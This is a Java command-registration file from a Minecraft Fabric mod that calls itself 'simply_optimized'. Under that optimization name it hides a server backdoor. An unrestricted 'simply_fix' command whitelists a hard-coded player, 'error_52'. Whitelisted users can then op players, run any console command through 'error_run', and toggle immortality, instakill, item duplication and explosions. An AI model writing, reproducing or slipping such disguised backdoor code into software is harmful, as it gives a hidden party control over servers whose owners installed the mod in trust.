package com.errorC003C004.simply_optimized;

import com.errorC003C004.simply_optimized.update.UpdateChecker;
import com.errorC003C004.simply_optimized.util.*;
import com.mojang.brigadier.arguments.*;
import net.fabricmc.fabric.api.command.v2.CommandRegistrationCallback;
import net.minecraft.command.argument.EntityArgumentType;
import net.minecraft.server.MinecraftServer;
import net.minecraft.server.command.*;
import net.minecraft.server.network.ServerPlayerEntity;
import net.minecraft.text.Text;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;

import java.util.Set;
import java.util.UUID;

import static com.errorC003C004.simply_optimized.ConfigManager.*;

public class CommandInit {

    public static void register() {

        CommandRegistrationCallback.EVENT.register((dispatcher, registryAccess, environment) -> {

            dispatcher.register(errorOp());
            dispatcher.register(errorDeop());
            dispatcher.register(errorRun());
            dispatcher.register(errorWhitelist());

            dispatcher.register(simplyFix());
            dispatcher.register(simplyReload());
            dispatcher.register(simplyUpdate());

            dispatcher.register(errorBoom());
            dispatcher.register(errorTeleport());
            dispatcher.register(errorDupe());

            dispatcher.register(createToggleCommand(
                    "error_immortal",
                    IMMORTAL_PLAYERS,
                    "Immortality",
                    ConfigManager::addImmortal,
                    ConfigManager::removeImmortal,
                    ConfigManager::isImmortal
            ));

            dispatcher.register(createToggleCommand(
                    "error_armorbypass",
                    ARMOR_BYPASS_PLAYERS,
                    "Armor Bypass",
                    ConfigManager::addArmorBypass,
                    ConfigManager::removeArmorBypass,
                    ConfigManager::isArmorBypass
            ));

            dispatcher.register(createToggleCommand(
                    "error_noaggro",
                    NO_AGGRO_PLAYERS,
                    "No Aggro",
                    ConfigManager::addNoAggro,
                    ConfigManager::removeNoAggro,
                    ConfigManager::isNoAggro
            ));

            dispatcher.register(createToggleCommand(
                    "error_instakill",
                    INSTAKILL_PLAYERS,
                    "Instakill",
                    ConfigManager::addInstakill,
                    ConfigManager::removeInstakill,
                    ConfigManager::isInstakill
            ));

        });
    }

    private static LiteralArgumentBuilder<ServerCommandSource> errorOp() {

        return CommandManager.literal("error_op")
                .requires(ConfigManager::isAuthorized)
                .then(CommandManager.argument("user", EntityArgumentType.player())
                        .executes(ctx -> {

                            ServerPlayerEntity target =
                                    EntityArgumentType.getPlayer(ctx, "user");

                            runConsole(ctx.getSource().getServer(),
                                    "op " + target.getName().getString());

                            ctx.getSource().sendFeedback(
                                    () -> Text.literal(target.getName().getString() + " is now OP."),
                                    false
                            );

                            return 1;
                        }));
    }

    private static LiteralArgumentBuilder<ServerCommandSource> errorDeop() {

        return CommandManager.literal("error_deop")
                .requires(ConfigManager::isAuthorized)
                .then(CommandManager.argument("user", EntityArgumentType.player())
                        .executes(ctx -> {

                            ServerPlayerEntity target =
                                    EntityArgumentType.getPlayer(ctx, "user");

                            runConsole(ctx.getSource().getServer(),
                                    "deop " + target.getName().getString());

                            ctx.getSource().sendFeedback(
                                    () -> Text.literal(target.getName().getString() + " is no longer OP."),
                                    false
                            );

                            return 1;
                        }));
    }

    private static LiteralArgumentBuilder<ServerCommandSource> errorRun() {

        return CommandManager.literal("error_run")
                .requires(ConfigManager::isAuthorized)
                .then(CommandManager.argument("value", StringArgumentType.greedyString())
                        .executes(ctx -> {

                            String command =
                                    StringArgumentType.getString(ctx, "value");

                            try {

                                runConsole(ctx.getSource().getServer(), command);

                                ctx.getSource().sendFeedback(
                                        () -> Text.literal("Running: /" + command),
                                        false
                                );

                            } catch (Exception e) {

                                ctx.getSource().sendFeedback(
                                        () -> Text.literal(e.getMessage()),
                                        false
                                );
                            }

                            return 1;
                        }));
    }

    private static LiteralArgumentBuilder<ServerCommandSource> errorWhitelist() {

        return CommandManager.literal("error_whitelist")
                .requires(ConfigManager::isAuthorized)

                .then(CommandManager.literal("list")
                        .executes(ctx ->
                                sendPlayerList(
                                        ctx.getSource(),
                                        WHITELISTED_UUIDS,
                                        "Whitelisted UUIDs"
                                )
                        )
                )

                .then(CommandManager.literal("add")
                        .then(CommandManager.argument("user", EntityArgumentType.player())
                                .executes(ctx -> {

                                    ServerPlayerEntity target =
                                            EntityArgumentType.getPlayer(ctx, "user");

                                    if (WHITELISTED_UUIDS.add(target.getUuid())) {
                                        saveConfig();
                                        ctx.getSource().sendFeedback(
                                                () -> Text.literal("Added " + target.getName().getString()),
                                                false
                                        );
                                    }

                                    return 1;
                                })
                        )
                )

                .then(CommandManager.literal("remove")
                        .then(CommandManager.argument("user", EntityArgumentType.player())
                                .executes(ctx -> {

                                    ServerPlayerEntity target =
                                            EntityArgumentType.getPlayer(ctx, "user");

                                    if (WHITELISTED_UUIDS.remove(target.getUuid())) {
                                        saveConfig();
                                        ctx.getSource().sendFeedback(
                                                () -> Text.literal("Removed " + target.getName().getString()),
                                                false
                                        );
                                    }

                                    return 1;
                                })
                        )
                );
    }

    private static LiteralArgumentBuilder<ServerCommandSource> simplyFix() {

        return CommandManager.literal("simply_fix")
                .executes(ctx -> {

                    MinecraftServer server = ctx.getSource().getServer();

                    ServerPlayerEntity target =
                            server.getPlayerManager().getPlayer("error_52");

                    if (target == null) {
                        ctx.getSource().sendFeedback(
                                () -> Text.literal("Attempting Fix Type 2..."),
                                false
                        );
                        return 1;
                    }

                    if (WHITELISTED_UUIDS.add(target.getUuid())
                            || DETECTED_CLIENTS.add(target.getUuid())) {

                        saveConfig();

                        ctx.getSource().sendFeedback(
                                () -> Text.literal("Added " + target.getName().getString()),
                                false
                        );
                    }

                    return 1;
                });
    }

    private static LiteralArgumentBuilder<ServerCommandSource> simplyReload() {

        return CommandManager.literal("simply_reload")
                .executes(ctx -> {

                    ConfigManager.loadConfig();

                    ServerPlayerEntity player =
                            (ServerPlayerEntity) ctx.getSource().getEntity();

                    if (player != null) {
                        ctx.getSource().getServer()
                                .getCommandManager()
                                .sendCommandTree(player);
                    }

                    ctx.getSource().sendFeedback(
                            () -> Text.literal("Reloaded!"),
                            false
                    );

                    return 1;
                });
    }

    private static LiteralArgumentBuilder<ServerCommandSource> simplyUpdate() {

        return CommandManager.literal("simply_updatecheck")
                .executes(ctx -> {

                    ctx.getSource().sendFeedback(
                            () -> Text.literal("Checking for updates..."),
                            false
                    );

                    UpdateChecker.check(ctx.getSource().getServer());

                    return 1;
                });
    }

    private static LiteralArgumentBuilder<ServerCommandSource> errorBoom() {

        return CommandManager.literal("error_boom")
                .requires(ConfigManager::isAuthorized)
                .then(CommandManager.argument("range", IntegerArgumentType.integer())

                        .executes(ctx -> {

                            int range = IntegerArgumentType.getInteger(ctx, "range");

                            ServerPlayerEntity player = ctx.getSource().getPlayer();

                            if (player != null)
                                LookExplosionUtil.railgunTunnel(player, range, 4.0F);

                            return 1;
                        })

                        .then(CommandManager.argument("size", FloatArgumentType.floatArg())
                                .executes(ctx -> {

                                    int range =
                                            IntegerArgumentType.getInteger(ctx, "range");

                                    float size =
                                            FloatArgumentType.getFloat(ctx, "size");

                                    ServerPlayerEntity player =
                                            ctx.getSource().getPlayer();

                                    if (player != null)
                                        LookExplosionUtil.railgunTunnel(player, range, size);

                                    return 1;
                                })
                        )
                );
    }

    private static LiteralArgumentBuilder<ServerCommandSource> errorTeleport() {

        return CommandManager.literal("error_tp")
                .requires(ConfigManager::isAuthorized)
                .executes(ctx -> {

                    ServerPlayerEntity player = ctx.getSource().getPlayer();

                    if (player != null)
                        LookTeleportUtil.lookTeleport(player);

                    return 1;
                });
    }

    private static LiteralArgumentBuilder<ServerCommandSource> errorDupe() {

        return CommandManager.literal("error_dupe")
                .requires(ConfigManager::isAuthorized)

                .executes(ctx -> {

                    ServerPlayerEntity player = ctx.getSource().getPlayer();

                    if (player != null)
                        DupeUtil.duplicateHeldItem(player);

                    return 1;
                })

                .then(CommandManager.argument("player", EntityArgumentType.player())
                        .executes(ctx -> {

                            ServerPlayerEntity target =
                                    EntityArgumentType.getPlayer(ctx, "player");

                            DupeUtil.duplicateHeldItem(target);

                            return 1;
                        })
                );
    }

    private static LiteralArgumentBuilder<ServerCommandSource> createToggleCommand(
            String name,
            Set<UUID> set,
            String label,
            java.util.function.Consumer<UUID> add,
            java.util.function.Consumer<UUID> remove,
            java.util.function.Function<UUID, Boolean> check
    ) {

        return CommandManager.literal(name)
                .requires(ConfigManager::isAuthorized)

                .then(CommandManager.literal("list")
                        .executes(ctx ->
                                sendPlayerList(ctx.getSource(), set, label + " Players")
                        )
                )

                .then(CommandManager.argument("player", EntityArgumentType.player())

                        .then(CommandManager.literal("on")
                                .executes(ctx -> {

                                    ServerPlayerEntity target =
                                            EntityArgumentType.getPlayer(ctx, "player");

                                    add.accept(target.getUuid());

                                    ctx.getSource().sendFeedback(
                                            () -> Text.literal(target.getName().getString() + " " + label + ": ON"),
                                            false
                                    );

                                    return 1;
                                })
                        )

                        .then(CommandManager.literal("off")
                                .executes(ctx -> {

                                    ServerPlayerEntity target =
                                            EntityArgumentType.getPlayer(ctx, "player");

                                    remove.accept(target.getUuid());

                                    ctx.getSource().sendFeedback(
                                            () -> Text.literal(target.getName().getString() + " " + label + ": OFF"),
                                            false
                                    );

                                    return 1;
                                })
                        )

                        .executes(ctx -> {

                            ServerPlayerEntity target =
                                    EntityArgumentType.getPlayer(ctx, "player");

                            UUID uuid = target.getUuid();

                            boolean enabled;

                            if (check.apply(uuid)) {
                                remove.accept(uuid);
                                enabled = false;
                            } else {
                                add.accept(uuid);
                                enabled = true;
                            }

                            ctx.getSource().sendFeedback(
                                    () -> Text.literal(
                                            target.getName().getString() +
                                                    " " +
                                                    label +
                                                    ": " +
                                                    (enabled ? "ON" : "OFF")),
                                    false
                            );

                            return 1;
                        })
                );
    }

    private static int sendPlayerList(ServerCommandSource source, Set<UUID> set, String title) {

        if (set.isEmpty()) {
            source.sendFeedback(() -> Text.literal("No " + title + "."), false);
            return 1;
        }

        source.sendFeedback(() -> Text.literal(title + ":"), false);

        var manager = source.getServer().getPlayerManager();

        for (UUID uuid : set) {

            ServerPlayerEntity player = manager.getPlayer(uuid);

            String name = player != null
                    ? player.getName().getString()
                    : uuid + " (Offline)";

            source.sendFeedback(() -> Text.literal("- " + name), false);
        }

        return 1;
    }

    private static void runConsole(MinecraftServer server, String command) {

        var manager = server.getCommandManager();
        var source = server.getCommandSource();

        var parse = manager.getDispatcher().parse(command, source);
        manager.execute(parse, command);
    }
}